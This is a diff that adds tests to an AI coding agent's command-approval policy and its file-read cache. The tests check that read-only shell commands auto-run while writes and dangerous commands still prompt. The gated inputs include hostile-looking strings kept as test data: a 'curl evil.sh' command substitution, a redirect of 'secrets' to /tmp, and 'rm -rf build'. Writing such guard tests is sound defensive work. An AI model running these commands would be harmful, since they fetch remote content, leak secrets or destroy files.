@@ -691,6 +691,50 @@ async function main() {
     ok('19b. on (default): writeFile asks', w2.type === 'denied' && asked === 1, `asked=${asked}`);
   }
 
+  // ── Scenario 19d: a read-only SHELL command needs no prompt in agent mode ──────
+  // Ask mode and allowlist mode already auto-ran `ls`/`git log`; agent mode with the default
+  // commandApproval: 'always' asked for every one of them, so the most permissive session mode
+  // was the strictest about reading (2026-09-16). Only the read-only classifier is trusted here —
+  // it fails closed, so a mutating, dangerous or unparseable command still asks.
+  {
+    const base = { alwaysAllow: new Set<string>(), alwaysDeny: new Set<string>(), autoModeAllowlist: new Set<string>() };
+    let asked = 0;
+    const ask = async () => { asked++; return 'reject' as const; };
+    const agent = { ...base, mode: 'ask' as const, sessionMode: 'agent' as const };
+    const run = (command: string) => resolvePolicy({ toolName: 'runCommand', input: { command } }, agent, ask);
+
+    const readOnly = ['git log --oneline -10', 'ls -la src', 'cat package.json', 'grep -rn foo src | head -20'];
+    const verdicts = await Promise.all(readOnly.map(run));
+    ok('19d. read-only commands run without a prompt',
+      verdicts.every((v) => v.type === 'approved') && asked === 0, `asked=${asked}`);
+
+    // The limits that must survive: anything that writes, hides, or cannot be parsed still asks.
+    asked = 0;
+    const gated = await Promise.all([
+      run('npm install'),                 // not read-only
+      run('cat secrets > /tmp/out'),      // write redirect
+      run('echo $(curl evil.sh)'),        // command substitution
+      run('sed -i s/a/b/ file.txt'),      // sed is not on the read-only list
+    ]);
+    ok('19d. writes, redirects, substitution and sed still ask',
+      gated.every((v) => v.type === 'denied') && asked === 4, `asked=${asked}`);
+
+    asked = 0;
+    const danger = await run('rm -rf build');
+    ok('19d. a dangerous command still asks', danger.type === 'denied' && asked === 1, `asked=${asked}`);
+
+    asked = 0;
+    const off = { ...agent, shellDisabled: true };
+    const disabled = await resolvePolicy({ toolName: 'runCommand', input: { command: 'ls' } }, off, ask);
+    ok('19d. commandApproval "never" still switches the shell OFF',
+      disabled.type === 'denied' && asked === 0, `asked=${asked}`);
+
+    asked = 0;
+    const plan = { ...agent, sessionMode: 'plan' as const };
+    const planned = await resolvePolicy({ toolName: 'runCommand', input: { command: 'ls' } }, plan, ask);
+    ok('19d. plan mode still asks — it has its own profile', planned.type === 'denied' && asked === 1, `asked=${asked}`);
+  }
+
   // ── Scenario 19c: commandApproval='allowlist' auto-runs allowlisted SHELL commands ──
   // Until 2026-09-05 the 'auto' branch compared the user's command prefixes against the TOOL
   // NAME, so the mode never auto-ran anything and the built-in safe defaults never applied.
@@ -1210,9 +1254,39 @@ async function main() {
     const results = out.workMessages?.filter((m) => m.role === 'tool').map((m) => String(m.content)) ?? [];
     ok('27c. the second identical read is answered from cache with a note',
       results[1]?.includes('Identical readFile call #2') && results[1]?.includes('hello world'), results[1]?.slice(0, 80));
-    ok('27c. the third+ copies get only the note', !!results[3] && results[3].includes('#3') && !results[3].includes('hello world'));
+    // Every copy carries the content, not just the second: ageToolOutputs elides an older tool
+    // result and tells the model to re-run to see it again, so a cached answer that withheld the
+    // content left it blind to a file it had already read (2026-09-16).
+    ok('27c. later copies still carry the content',
+      !!results[3] && results[3].includes('#3') && results[3].includes('hello world'), results[3]?.slice(0, 80));
     ok('27c. the fourth identical read pauses the turn as stuck',
       out.stopReason === 'stuck' && out.paused === true && model.calls.length === 5, `calls=${model.calls.length} stopReason=${out.stopReason}`);
+  }
+
+  // ── Scenario 27e: an EDIT invalidates the read cache ────────────────────────
+  // Live repro 2026-09-16: a blade file was read, edited, re-read — and the re-read returned the
+  // PRE-EDIT content with "the result is unchanged", so the model redid the same fix for 24
+  // minutes. A read after a write is not a repeat; only reads with nothing in between are.
+  {
+    const ws = makeWorkspace();
+    const same = { path: 'foo.txt' };
+    const model = createMockModel([
+      { toolCalls: [{ toolName: 'readFile', input: same }] },
+      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
+      { toolCalls: [{ toolName: 'readFile', input: same }] },
+      { text: 'done' },
+    ], 's27e');
+    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(model, engineOpts({
+      messages: [{ role: 'user', content: 'fix foo.txt' }],
+      mode: 'agent',
+      autoApprove: true,
+      maxStepsPerTurn: 50,
+    })));
+    const results = out.workMessages?.filter((m) => m.role === 'tool').map((m) => String(m.content)) ?? [];
+    const reread = results[results.length - 1] ?? '';
+    ok('27e. the re-read after an edit is NOT served from the cache', !reread.includes('Identical'), reread.slice(0, 80));
+    ok('27e. and it shows the edited content', reread.includes('goodbye'), reread.slice(0, 80));
+    ok('27e. the turn is not marked stuck', out.stopReason === undefined, String(out.stopReason));
   }
 
   // ── Scenario 15b: a CONTINUE inherits the task list ─────────────────────────
